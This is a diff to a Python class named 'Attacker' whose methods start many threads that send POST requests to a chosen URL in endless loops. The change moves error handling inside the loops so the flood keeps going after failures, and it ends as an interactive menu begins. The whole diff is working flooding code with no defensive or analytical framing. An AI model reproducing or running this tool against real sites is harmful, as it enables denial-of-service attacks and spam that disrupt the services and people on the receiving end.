@@ -10,58 +10,55 @@ class Attacker:
         self.thread_len = thread_len
 
     def post(self, url: str, headers: dict = {}, data: dict = {}):
-        try:
-            if self.thread_len == 0:
-                r.post(url, headers=headers, data=data)
-                print(f'Sent request to {url} using Headers: {headers} and Data: {data}')
-                return
-            else:
-                threads = []
-                def post_loop():
-                    while True:
+        if self.thread_len == 0:
+            r.post(url, headers=headers, data=data)
+            print(f'Sent request to {url} using Headers: {headers} and Data: {data}')
+            return
+        else:
+            threads = []
+            def post_loop():
+                while True:
+                    try:
                         r.post(url, headers=headers, data=data)
                         print(f'Sent request to {url} using Headers: {headers} and Data: {data}')
-                    
-                for thread in range(self.thread_len):
-                    th = threading.Thread(target=post_loop, daemon=True)
-                    threads.append(th)
+                    except Exception:
+                        print(traceback.format_exc())
+                        
+            for thread in range(self.thread_len):
+                th = threading.Thread(target=post_loop, daemon=True)
+                threads.append(th)
 
-                for thread in range(self.thread_len): ## Starting threads in the threads list
-                    threads[thread].start()
+            for thread in range(self.thread_len): ## Starting threads in the threads list
+                threads[thread].start()
 
-                for thread in range(self.thread_len): 
-                    threads[thread].join()
-
-        except Exception:
-            print(traceback.format_exc())
-            
+            for thread in range(self.thread_len): 
+                threads[thread].join()
 
     def aiopost(self, url: str, headers: dict = {}, data: dict = {}, rate: float = 0.0):
-        try:
-            if self.thread_len == 0:
-                r.post(url, headers=headers, data=data)
-                print(f'Sent request to {url} using Headers: {headers} and Data: {data}')
-            else:
-                threads = []
+        if self.thread_len == 0:
+            r.post(url, headers=headers, data=data)
+            print(f'Sent request to {url} using Headers: {headers} and Data: {data}')
+        else:
+            threads = []
 
-                def aiopost_loop():
-                    while True:
+            def aiopost_loop():
+                while True:
+                    try:
                         r.post(url, headers=headers, data=data)
                         print(f'Sent request to {url} using Headers: {headers} and Data: {data}')
                         time.sleep(rate)
+                    except Exception:
+                        print(traceback.format_exc())
                         
-                for thread in range(self.thread_len):
-                    th = threading.Thread(target=aiopost_loop, daemon=True)
-                    threads.append(th)
+            for thread in range(self.thread_len):
+                th = threading.Thread(target=aiopost_loop, daemon=True)
+                threads.append(th)
 
-                for thread in range(self.thread_len): ## Starting threads in the threads list
-                    threads[thread].start()
+            for thread in range(self.thread_len): ## Starting threads in the threads list
+                threads[thread].start()
 
-                for thread in range(self.thread_len): 
-                    threads[thread].join()
-        
-        except Exception:
-            print(traceback.format_exc())
+            for thread in range(self.thread_len): 
+                threads[thread].join()
             
 def Cor():
     choice = input("""
